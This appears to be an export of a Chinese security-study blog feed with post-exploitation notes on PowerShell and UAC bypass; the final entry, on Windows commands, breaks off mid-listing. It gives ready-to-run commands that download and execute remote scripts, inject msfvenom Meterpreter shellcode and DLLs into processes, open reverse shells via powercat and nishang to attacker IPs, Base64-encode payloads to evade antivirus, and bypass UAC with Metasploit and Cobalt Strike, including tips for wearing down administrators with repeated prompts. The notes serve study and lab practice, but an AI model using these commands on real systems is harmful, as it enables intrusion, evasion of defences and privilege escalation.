        <content type="html"><![CDATA[<h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><h4 id="Powershell基本概念"><a href="#Powershell基本概念" class="headerlink" title="Powershell基本概念"></a>Powershell基本概念</h4><p>Windows PowerShell是一种命令行外壳程序和脚本环境，可以看作是命令行提示符cmd.exe的扩展，其使命令行用户和脚本编写者可以利用.NET Framework的强大功能。只要可以在一台计算机上运行代码，就可以将PowerShell脚本文件（.ps1）下载到磁盘中执行（甚至无须将脚本文件写到磁盘中）。</p><h4 id="Powershell特点"><a href="#Powershell特点" class="headerlink" title="Powershell特点"></a>Powershell特点</h4><ul><li>在Windows 7以上版本是默认安装的；</li><li>脚本可以在内存中运行，不需要写入磁盘；</li><li>几乎不会触发杀毒软件；</li><li>可远程执行；</li><li>目前很多工具都是局域PowerShell开发的；</li><li>使Windows脚本的执行更为容易；</li><li>cmd.exe的运行通常会被阻止，但PowerShell的运行通常不会被阻止；</li><li>可用于管理活动目录；</li></ul><h4 id="Powershell执行策略"><a href="#Powershell执行策略" class="headerlink" title="Powershell执行策略"></a>Powershell执行策略</h4><p>为了防止使用者运行恶意脚本，PowerShell提供了一个执行策略。在默认情况下，这个执行策略被设置为“不能运行”。</p><p>使用如下的cmdlet命令查询当前的执行策略：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS E:\&gt; Get-ExecutionPolicy</span><br><span class="line">Restricted</span><br></pre></td></tr></table></figure><h5 id="常见的执行策略值"><a href="#常见的执行策略值" class="headerlink" title="常见的执行策略值"></a>常见的执行策略值</h5><ul><li>Restricted：脚本不能运行（默认设置）；</li><li>RemoteSigned：在本地创建的脚本可以运行，但不能运行网上下载的脚本（拥有数字证书的除外）；</li><li>AllSigned：仅当脚本由受信任的发布者签名时才能运行；</li><li>Unrestricted：允许所有脚本运行；</li></ul><p>使用下面的cmdlet命令设置PowerShell的执行策略：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS E:\&gt; Set-ExecutionPolicy &lt;policy name&gt;</span><br></pre></td></tr></table></figure><h5 id="绕过执行策略"><a href="#绕过执行策略" class="headerlink" title="绕过执行策略"></a>绕过执行策略</h5><p>PowerSploit是一款基于PowerShell的后渗透测试框架，其中包含很多PowerShell脚本，主要用于渗透测试中的信息收集、权限提升、权限维持。</p><p>想运行PowerShell脚本，必须使用管理员权限将执行策略从Restricted改为Unrestricted。</p><h6 id="Bypass本地权限并执行"><a href="#Bypass本地权限并执行" class="headerlink" title="Bypass本地权限并执行"></a>Bypass本地权限并执行</h6><ul><li><p>将PowerShell脚本文件test.ps1上传至目标服务器。在命令行环境下，执行如下命令，绕过安全策略，在目标服务器本地执行该脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -File test.ps1</span><br></pre></td></tr></table></figure></li><li><p>用iex下载远程PS1脚本绕过权限执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass-WindowStyle Hidden-NoProfile-NonI IEX(New-ObjectNet.WebClient).DownloadString(&quot;xxx.ps1&quot;);[Parameters]</span><br></pre></td></tr></table></figure></li></ul><h4 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h4><h5 id="PowerSploit基本概念"><a href="#PowerSploit基本概念" class="headerlink" title="PowerSploit基本概念"></a>PowerSploit基本概念</h5><p>PowerSploit是GitHub上面的一个安全项目，上面有很多powershell攻击脚本，它们主要被用来渗透中的信息侦察、权限提升、权限维持。</p><h5 id="PowerSploit特点"><a href="#PowerSploit特点" class="headerlink" title="PowerSploit特点"></a>PowerSploit特点</h5><p>1.代码运行在内存中可以不去接触磁盘</p><p>2.从另一个系统中下载代码并执行</p><p>3.很多安全产品并不能监测到powershell的活动</p><p>4.cmd.exe通常被阻止运行，但是powershell不会</p><h5 id="PowerSploit下载"><a href="#PowerSploit下载" class="headerlink" title="PowerSploit下载"></a>PowerSploit下载</h5><p>Github下载之后，我们放到攻击机的web目录，以便于在目标机器的powershell中下载对应的利用脚本。</p><h5 id="PowerSploit模块"><a href="#PowerSploit模块" class="headerlink" title="PowerSploit模块"></a>PowerSploit模块</h5><ul><li><p>CodeExecution模块–Invoke-Shellcode脚本</p><p>   直接执行shellcode反弹meterpreter shell</p><ul><li><p>利用msfvenom生成一个反弹木马，以供invoke-shellcode注入。</p></li><li><p>调用目标机的powershell进行IEX远程下载invoke-shellcode脚本和生成的木马。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.Webclient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.190.141&#x2F;PowerSp</span><br><span class="line">loit&#x2F;CodeExecution&#x2F;Invoke-Shellcode.ps1&quot;)</span><br></pre></td></tr></table></figure></li><li><p>下载生成好的木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; IEX(New-Object Net.Webclient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.190.141&#x2F;code&quot;)</span><br></pre></td></tr></table></figure></li><li><p>kali设置msf监听</p></li><li><p>在powershell中调用invoke-shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; Invoke-Shellcode -Shellcode $buf -Force</span><br></pre></td></tr></table></figure></li></ul><p>指定进程注入shellcode反弹meterpreter shell</p><ul><li><p>下载ps脚本和木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.Webclient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.190.141&#x2F;PowerSp</span><br><span class="line">loit&#x2F;CodeExecution&#x2F;Invoke-Shellcode.ps1&quot;)</span><br><span class="line">PS C:\Users\Administrator&gt; IEX(New-Object Net.Webclient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.190.141&#x2F;code&quot;)</span><br></pre></td></tr></table></figure></li><li><p>选择注入的进程—直接选择系统进程，因为如果我们的进程关闭，我们的会话也会关闭，系统进程一般不回被关闭。<br>常见系统进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">explorer进程(Windows程序管理器或者文件资源管理器)</span><br></pre></td></tr></table></figure></li><li><p>Get-Process或者ps命令查看当前所有的进程。</p><p><code>ps -Name explorer</code>查看某一个进程的PID。</p></li><li><p>注入id为1228的进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Shellcode -Shellcode $buf -ProcessID 1228 -Force调用invoke-dllinjection将DLL注入到进程中。</span><br></pre></td></tr></table></figure></li></ul></li><li><p>CodeExecution模块–调用invoke-dllinjection将DLL注入到进程中</p><ul><li><p>msf生成dll文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.190.141 lport&#x3D;4444 -f dll -o &#x2F;var&#x2F;www&#x2F;html&#x2F;code.dll</span><br></pre></td></tr></table></figure></li><li><p>Powershel 下载dllinjection文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; IEX(New-Object Net.Webclient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.190.141&#x2F;PowerSploit&#x2F;CodeExecutio</span><br><span class="line">n&#x2F;Invoke-DllInjection.ps1&quot;)</span><br></pre></td></tr></table></figure></li><li><p>将dll注入到某一个进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; Invoke-DllInjection -Dll .\code.dll -ProcessID 2700</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="powershell反弹shell常见方式"><a href="#powershell反弹shell常见方式" class="headerlink" title="powershell反弹shell常见方式"></a>powershell反弹shell常见方式</h4><ul><li><p>powercat反弹shell </p><p>powercat为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat 。</p><ul><li><p>下载脚本文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString (&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;);</span><br></pre></td></tr></table></figure></li><li><p>反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 192.168.159.134 -p 6666 -e cmd</span><br></pre></td></tr></table></figure></li></ul></li><li><p>nishang反弹shell </p><p>Nishang是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。</p><ul><li><p>反弹TCPshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com &#x2F;samratashok&#x2F;nishang&#x2F;9a3c747bcf535ef82dc4c5c66aac36db47c2afde&#x2F;Shells&#x2F;Invoke-PowerShellTcp.ps1&#39;); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.159.134 -port 6666</span><br></pre></td></tr></table></figure></li><li><p>自定义powershell函数反弹shell </p></li><li><p>反弹UDPshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.159.134&#x2F;nishang&#x2F;Shells&#x2F;Invoke-PowerShellUdp.ps1&#39;); Invoke-PowerShellUdp -Reverse -IPAddress 192.168.159.134 -port 53</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="使用Base64对PowerShell命令进行编码"><a href="#使用Base64对PowerShell命令进行编码" class="headerlink" title="使用Base64对PowerShell命令进行编码"></a>使用Base64对PowerShell命令进行编码</h4><p>使用Base64编码PowerShell命令可以起到混淆和压缩代码的作用，避免一些特殊字符导致脚本被杀毒软件所查杀。</p><p>使用一个Python脚本文件<a href="https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py">ps_encoder.py</a>，其使用Base64编码封装的PowerShell命令包，其目的是混淆和压缩代码。</p><ul><li><p>将payload输入到文件中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# echo &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;cheetz&#x2F;PowerSploit&#x2F;master&#x2F;CodeExecution&#x2F;Invoke--Shellcode.ps1&#39;); Invoke-Shellcode -Payload windows&#x2F;meterpreter&#x2F;reverse_https -Lhost 192.168.10.137 -Lport 666 -Force&quot; &gt;raw.txt</span><br></pre></td></tr></table></figure></li><li><p>使用脚本对其编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# python ps_encoder.py -s raw.txt</span><br><span class="line">SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABlAGUAdAB6AC8AUABvAHcAZQByAFMAcABsAG8AaQB0AC8AbQBhAHMAdABlAHIALwBDAG8AZABlAEUAeABlAGMAdQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQAtAFMAaABlAGwAbABjAG8AZABlAC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlACAALQBQAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZQB2AGUAcgBzAGUAXwBoAHQAdABwAHMAIAAtAEwAaABvAHMAdAAgADEAOQAyAC4AMQA2ADgALgAxADAALgAxADMANwAgAC0ATABwAG8AcgB0ACAANgA2ADYAIAAtAEYAbwByAGMAZQAKAA&#x3D;&#x3D;</span><br><span class="line">root@kali:~&#x2F;Desktop#</span><br></pre></td></tr></table></figure></li><li><p>在目标机器上执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -NoP -NonI -Exec Bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABlAGUAdAB6AC8AUABvAHcAZQByAFMAcABsAG8AaQB0AC8AbQBhAHMAdABlAHIALwBDAG8AZABlAEUAeABlAGMAdQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQAtAFMAaABlAGwAbABjAG8AZABlAC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlACAALQBQAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZQB2AGUAcgBzAGUAXwBoAHQAdABwAHMAIAAtAEwAaABvAHMAdAAgADEAOQAyAC4AMQA2ADgALgAxADAALgAxADMANwAgAC0ATABwAG8AcgB0ACAANgA2ADYAIAAtAEYAbwByAGMAZQAKAA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4></li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网学习--UAC</title>
      <link href="2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/"/>
      <url>2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/</url>
      
        <content type="html"><![CDATA[<h1 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h1><h4 id="uac"><a href="#uac" class="headerlink" title="uac"></a>uac</h4><p>用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC 可以阻止未经授权的应用程序自动进行安装，并防止无意中更改系统设置。</p><p>即在权限不够的情况下，访问系统磁盘的根目录、window目录、Program File目录，以及读、写系统登录数据库的程序等操作，都需要经过UAC认证。</p><p>注意</p><p>在其Windows Vista及更高版本操作系统中才会有UAC,Windows Vista是微软公司所研发的具有重大创新意义的一个版本，其内核版本号为Windows NT 6.0。</p><p>具体的windows版本可以查看<code>https://blog.csdn.net/jincf2011/article/details/6696133</code>。</p><p>如果要获取管理员权限，可以通过以下几条：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1，进程已经拥有管理权限控制；</span><br><span class="line">2，进程被用户允许通过管理员权限运行。</span><br></pre></td></tr></table></figure><h4 id="uac等级"><a href="#uac等级" class="headerlink" title="uac等级"></a>uac等级</h4><ul><li><p>始终通知：最严格的设置，每当程序需要使用高级别的权限的时候都会提示本地用户。</p></li><li><p>仅在程序试图更改我的计算机时通知我：这是UAC的默设置。当本地的Windows程序要使用高级别的权限时，不会通知用户。但是，当第三方程序要使用高级别权限时，会提示本地用户。</p></li><li><p>仅在程序试图更改我的计算机时通知我(不降低桌面亮度)：与上一条设置的要求相同，但是在提示时用户不简单桌面的亮度。</p></li><li><p>从不提示：当用户为系统管理员时，所有程序都会以最高权限运行。</p></li></ul><h4 id="将会触发UAC授权的操作"><a href="#将会触发UAC授权的操作" class="headerlink" title="将会触发UAC授权的操作"></a>将会触发UAC授权的操作</h4><ol><li>配置Windows Update</li><li>增加或删除用户账户</li><li>改变用户的账户类型</li><li>改变UAC设置</li><li>安装ActiveX</li><li>安装或移除程序</li><li>安装设备驱动程序</li><li>设置家长控制</li><li>将文件移动或复制到Program Files或Windows目录</li><li>查看其他用户文件夹</li></ol><h4 id="查看当前用户的UAC等级"><a href="#查看当前用户的UAC等级" class="headerlink" title="查看当前用户的UAC等级"></a>查看当前用户的UAC等级</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WHOAMI &#x2F;Groups | FIND &quot;S-1-16&quot;</span><br><span class="line">Mandatory Label\Medium Mandatory Level Label S-1-16-8192</span><br></pre></td></tr></table></figure><h4 id="UAC-Bypass"><a href="#UAC-Bypass" class="headerlink" title="UAC Bypass"></a>UAC Bypass</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1，白名单提权机制；如Wusa.exe Bypass UAC,infDefault.exe Bypass UAC,PkgMgr.exe Bypass UAC等。</span><br><span class="line">2，DLL 劫持；</span><br><span class="line">3，Windows 自身漏洞提权；</span><br><span class="line">4，远程注入；</span><br><span class="line">5，COM 接口技术。</span><br></pre></td></tr></table></figure><h4 id="Metasploit绕过UAC"><a href="#Metasploit绕过UAC" class="headerlink" title="Metasploit绕过UAC"></a>Metasploit绕过UAC</h4><h5 id="bypassuac模块"><a href="#bypassuac模块" class="headerlink" title="bypassuac模块"></a>bypassuac模块</h5><p>该模块将通过进程注入，利用受信任的发布者证书绕过Windows UAC。 它将为我们生成另一个关闭UAC的shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;local&#x2F;bypassuac):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   SESSION                     yes       The session to run this module on.</span><br><span class="line">   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt;</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>使用bypassuac模块进行提权时，系统当前用户必须在管理员组。</li><li>用户账户控制程序UAC设置为默认，即”仅在程序试图更改我的计算机时通知我”。</li></ul><h5 id="RunAs模块"><a href="#RunAs模块" class="headerlink" title="RunAs模块"></a>RunAs模块</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;ask</span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;ask) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;local&#x2F;ask):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   FILENAME                    no        File name on disk</span><br><span class="line">   PATH                        no        Location on disk, %TEMP% used if not set</span><br><span class="line">   SESSION                     yes       The session to run this module on.</span><br><span class="line">   TECHNIQUE  EXE              yes       Technique to use (Accepted: PSH, EXE)</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li><p>use exploit/windows/local/bypassuac_injection</p><p>set target  1         #设置目标系统类型，1是64位，0是32位</p></li><li><p>使用RunAs模块进行提权时，系统当前用户须在管理员组或者知道管理员的密码，用户账户控制程序UAC设置则没有要求。<br>使用RunAs模块进行提权时，会创建一个可执行文件，为了避免给杀毒软件查杀，该可执行文件（需进行免杀处理）的创建要使用EXE::Custom选项。</p><p>RunAs攻击的缺点是，程序企图修改计算机设置时，系统会对用户发出提醒。此警报可能会被管理人员认定为攻击。建议多次运行，系统多次对用户发出提醒后，对于缺乏安全意识或不厌其烦的管理人员会点击“是”，从而完成权限提升。</p></li></ul><h5 id="bypassuac-injection模块"><a href="#bypassuac-injection模块" class="headerlink" title="bypassuac_injection模块"></a>bypassuac_injection模块</h5><p>内存注入，bypassuac模块运行时会在目标机上创建多个文件，会被杀毒软件识别。exploit/windows/local/bypassuac_injection模块直接运行在内存中的反射DLL中，所以它不触碰硬盘，可以最大限度地降低被杀毒软件检测到的概率。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection</span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;bypassuac_injection) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br></pre></td></tr></table></figure><ul><li>模块的使用需要选择正确的架构。</li></ul><h5 id="bypassuac-fodhelper模块"><a href="#bypassuac-fodhelper模块" class="headerlink" title="bypassuac_fodhelper模块"></a>bypassuac_fodhelper模块</h5><p>通过在当前用户配置单元下劫持注册表中的特殊键，并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_fodhelper</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_fodhelper) &gt; set session 1</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_fodhelper) &gt; exploit</span><br></pre></td></tr></table></figure><h5 id="bypassuac-eventvwr模块"><a href="#bypassuac-eventvwr模块" class="headerlink" title="bypassuac_eventvwr模块"></a>bypassuac_eventvwr模块</h5><p>该模块通过在当前用户配置单元下劫持注册表中的特殊键，并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; set session 1</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; exploit</span><br></pre></td></tr></table></figure><h5 id="bypassuac-comhijack模块"><a href="#bypassuac-comhijack模块" class="headerlink" title="bypassuac_comhijack模块"></a>bypassuac_comhijack模块</h5><p>模块将通过在HKCU配置单元中，创建COM处理程序注册表项来绕过Windows UAC。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_comhijack</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_comhijack) &gt; set session 1</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_comhijack) &gt; exploit</span><br></pre></td></tr></table></figure><h4 id="Cobalt-Strike绕过UAC"><a href="#Cobalt-Strike绕过UAC" class="headerlink" title="Cobalt Strike绕过UAC"></a>Cobalt Strike绕过UAC</h4><p>当前用户不是管理员，攻击会失效。要检查当前用户是否在管理员组里，使用 <code>run whoami /groups</code> 命令，查看当前用户组，如果权限不够，需要先提权，至 <code>Administrator</code> 或者 <code>SYSTEM</code> 权限。然后再通过 <code>elevate</code> 命令使用这些 Bypass UAC 的模块。</p><p>右击一个beacon-&gt;执行-&gt;提权-&gt;选择监听器-&gt;选择exp<code>uac-token-duplication</code>。</p><p>也可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">elevate uac-token-duplication beacon名字</span><br></pre></td></tr></table></figure><p>如果Bypass UAC 的 Beacon shell 是普通用户权限，我们需要在目标机器上点击弹出的对话框来确定是否更改UAC。</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试--windows系统信息收集与提权-(1)</title>
      <link href="2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(1)/"/>
      <url>2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(1)/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-命令行基础"><a href="#Windows-命令行基础" class="headerlink" title="Windows 命令行基础"></a>Windows 命令行基础</h1><h2 id="列出当前文件清单"><a href="#列出当前文件清单" class="headerlink" title="列出当前文件清单"></a>列出当前文件清单</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\12521\Desktop&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    目录: C:\Users\12521\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----       2020&#x2F;10&#x2F;28     20:52                CTFTools</span><br><span class="line">d-----        2020&#x2F;11&#x2F;6     17:30                md</span><br><span class="line">d-----       2020&#x2F;11&#x2F;13     14:21                PHP开发资料</span><br><span class="line">d-----        2017&#x2F;7&#x2F;19      6:47                RSA-and-LLL-attacks-master</span><br><span class="line">d-----        2020&#x2F;11&#x2F;8     13:43                RSA-master</span><br><span class="line">d-----       2020&#x2F;11&#x2F;12     17:04                steady-learn</span><br><span class="line">d-----        2020&#x2F;11&#x2F;6     17:39                大三学习</span><br><span class="line">d-----        2020&#x2F;11&#x2F;8     15:04                常用文件</span><br><span class="line">-a----       2020&#x2F;10&#x2F;25     18:05            729 010 Editor.lnk</span><br><span class="line">-a----       2020&#x2F;11&#x2F;16  